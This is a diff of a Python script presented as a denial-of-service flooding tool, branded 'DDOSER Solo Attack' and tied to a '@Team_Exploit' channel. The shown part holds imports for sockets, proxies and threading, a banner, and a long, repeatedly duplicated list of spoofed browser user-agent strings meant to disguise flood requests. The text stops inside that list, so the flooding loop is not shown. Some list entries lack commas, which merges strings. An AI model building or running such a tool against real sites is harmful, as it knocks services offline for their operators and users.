@@ -1,30 +1,309 @@
-#INSTALL THESE LIBS: pkg install python3 pip3 install bs4 pip3 install pysocks 
-import os, sys, time
 import socket
 import socks
 import threading
-import random
-import re
+import random,os
 import urllib.request
-import os
-import sys
-from bs4 import BeautifulSoup
+from requests import get
+from platform import uname
+rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
+cn = '\033[00;36m'
 
-os.system("clear")
-try:
-	from scapy.all import *
-except:
-	print ("[DDOS - FREE]-HTTP FLOOD")
+if 'Windows' in uname():
+	try:from colorama import init
+	except:os.system("pip install colorama")
+	os.system("cls")
+else:
+	os.system("clear")
 
-print('''
-   ___  ___  ___  ___ 
- | __>| . \| __>| __>
- | _> |   /| _> | _> 
- |_|  |_\_\|___>|___>                                                          	  
-   SYSTEM : PYTHON3
-''')
+print(f"""{lrd}
 
-useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
+  oo_        .-.      W  W        .-.     
+ /  _)-<   c(O_O)c   (O)(O)     c(O_O)c   
+ \__ `.   ,'.---.`,    ||      ,'.---.`,  
+    `. | / /|_|_|\ \   | \    / /|_|_|\ \ 
+    _| | | \_____/ |   |  `.  | \_____/ | 
+ ,-'   | '. `---' .`  (.-.__) '. `---' .` 
+(_..--'    `-...-'     `-'      `-...-'   
+
+            {cn}DDOSER Solo Attack {yw}| {pe}Channel : @Team_Exploit""")
+
+useragents = ["AdsBot-Google ( http://www.google.com/adsbot.html)",
+            "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
+            "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+            "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+            "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
+            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
+            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+    "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19",
+    "Mozilla/5.0 (Linux; Android 6.0.1; RedMi Note 5 Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 6.0; LG-H631 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a1) Gecko/20070308 Minefield/3.0a1",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.157 Safari/537.36",
+    "BrightSign/8.0.69 (XT1143)Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.11.2 Chrome/65.0.3325.230 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+            "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+            "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+    "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19",
+    "Mozilla/5.0 (Linux; Android 6.0.1; RedMi Note 5 Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 6.0; LG-H631 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a1) Gecko/20070308 Minefield/3.0a1",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.157 Safari/537.36",
+    "BrightSign/8.0.69 (XT1143)Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.11.2 Chrome/65.0.3325.230 Safari/537.36"
+
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
+            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+            "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec               /10.0.1",
+            "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
+            "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+            "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+            "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
+            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
+            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+    "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19",
+    "Mozilla/5.0 (Linux; Android 6.0.1; RedMi Note 5 Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 6.0; LG-H631 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a1) Gecko/20070308 Minefield/3.0a1",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.157 Safari/537.36",
+    "BrightSign/8.0.69 (XT1143)Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.11.2 Chrome/65.0.3325.230 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+            "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+            "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+    "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19",
+    "Mozilla/5.0 (Linux; Android 6.0.1; RedMi Note 5 Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 6.0; LG-H631 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a1) Gecko/20070308 Minefield/3.0a1",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.157 Safari/537.36",
+    "BrightSign/8.0.69 (XT1143)Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.11.2 Chrome/65.0.3325.230 Safari/537.36"
+
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
+            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+            "AdsBot-Google ( http://www.google.com/adsbot.html)",
+            "Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522  (KHTML, like Gecko) Safari/419.3",
+            "Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
+			"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
+			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
+			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
+			"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
+			"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
+			"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
+			"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
+			"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
+			"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
+			"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
+			"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
+			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
+			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
+			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
+			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
+			"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
+			"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
+			"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
+			"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
+			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
